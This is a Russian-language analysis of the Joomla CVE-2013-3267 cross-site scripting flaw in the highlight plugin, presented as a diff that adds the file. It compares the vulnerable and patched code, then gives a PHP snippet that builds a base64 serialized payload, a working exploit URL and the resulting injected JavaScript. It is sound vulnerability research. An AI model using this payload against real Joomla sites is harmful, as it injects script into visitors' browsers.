@@ -1,0 +1,132 @@
+Анализ Joomla CVE-2013-3267
+===========================
+
+
+Описание
+--------
+
+Согласно _[1]_ уязвимости подвержены версии *joomla!* версии 2.5.x до 2.5.10 и версии 3.0.x до 3.0.4.
+
+В описании информация о том что причина уязвимости - недостаточная фильтрация в плагине *highlighter*.
+Т.е. в данном случае нас интересует исходники плагина *highlight* (plugins/system/highlight/highlight.php).
+
+
+Исследование исходного кода
+---------------------------
+
+Определим изменения между уязвимой и исправленной версиями *joomla*:
+
+----
+
+@@ -58 +58 @@
+-               $terms = $terms ? unserialize(base64_decode($terms)) : null;
++               $terms = $terms ? json_decode(base64_decode($terms)) : null;
+@@ -72 +72 @@
+-                       $cleanTerms[] = $filter->clean($term, 'string');
++                       $cleanTerms[] = htmlspecialchars($filter->clean($term, 'string'));
+----
+
+Теперь разберёмся как работает метод *onAfterDispatch* класса *PlgSystemHighlight* в котором сделаны изменения.
+
+Перво наперво проводится несколько разнообразных проверок и достаётся переданный плагину параметер.
+После чего полученные данные декодируются из base_64 и пропускаются через функцию *unserialize*:
+
+----
+  $terms = $terms ? unserialize(base64_decode($terms)) : null;
+----
+
+Пропускаются через фильтр (метод тыка подсказал что фильтр убирает html теги и экранирует двойную кавычку):
+  
+----
+
+  $filter = JFilterInput::getInstance();
+
+  $cleanTerms = array();
+  foreach ($terms as $term)
+  {
+    $cleanTerms[] = $filter->clean($term, 'string');
+  }
+----
+
+В завершение всё выводится с помощью
+
+----
+  JHtml::_('behavior.highlighter', $cleanTerms);
+----
+
+на страницу в javascript в заголовке страницы:
+
+----
+highlighter = new Joomla.Highlighter({
+	startElement: start,
+	endElement: end,
+	className: 'highlight',
+	onlyWords: false,
+	tag: 'span'
+}).highlight(["$INJECTED_CODE_HERE"]);
+----
+
+где *$INJECTED_CODE_HERE* - место в которое помещаются данные, переданные в Html::_
+
+Эксплуатация уязвимости
+----------------------
+
+В кратце про функцию *unserialize*. Она создаёт php объект из переданной сериализированной (функция *serialize*) строки. Подробнее можно почитать тут _[2]_.
+
+Получается для того что бы внедрить свои данные на html страницу нам необходимо при обращении к сайту в параметер *highlight* передать закодированный в base64 сериализованный массив содержащий наш код.
+
+Например если мы хотим вывести простой *alert* для получения необходимой строки можно воспользоваться следующим php сниппетом.
+
+----
+$arr= Array('none\\"]);
+})
+alert(7331);
+window.addEvent(\'domready\', function () {
+
+// comment');
+
+echo urlencode(base64_encode(serialize($arr)));
+----
+
+Несколько пояснений:
+
+* Необходимо добавить обратный слеш перед двойной кавычкой чтобы экранировать '\' который добавляет фильтр;
+* Для сохранения корректности JS синтаксиса добавим ']) что бы закрыть скобки в коде.
+* Для этой же цели необходим фрагмент дальше *window.addEvent* и комментарий вконце строки.
+
+Теперь проверим получившийся url в браузере
+
+----
+http://localhost/?highlight=YToxOntpOjA7czo4NDoibm9uZVwiXSk7DQp9KQ0KYWxlcnQoNzMzMSk7DQp3aW5kb3cuYWRkRXZlbnQoJ2RvbXJlYWR5JywgZnVuY3Rpb24gKCkgew0KDQovLyBjb21tZW50Ijt9
+----
+
+В результате кусок javascript в заголовке страницы примет такой вид:
+
+----
+highlighter = new Joomla.Highlighter({
+					startElement: start,
+					endElement: end,
+					className: 'highlight',
+					onlyWords: false,
+					tag: 'span'
+				}).highlight(["none\\"]);
+})
+alert(7331);
+window.addEvent('domready', function () {
+
+// comment"]);
+				start.dispose();
+				end.dispose();
+			});
+----
+
+и при открытии страницы в браузере мы увидим долгожданный *alert*.
+
+Ссылки:
+------
+
+_[1]_ http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3267
+
+_[2]_ http://blog.spiderlabs.com/2013/06/exploiting-serialized-xss-in-joomla-return-of-the-undead-cve.html
+
+_[3]_ http://www.php.net/manual/en/function.unserialize.php
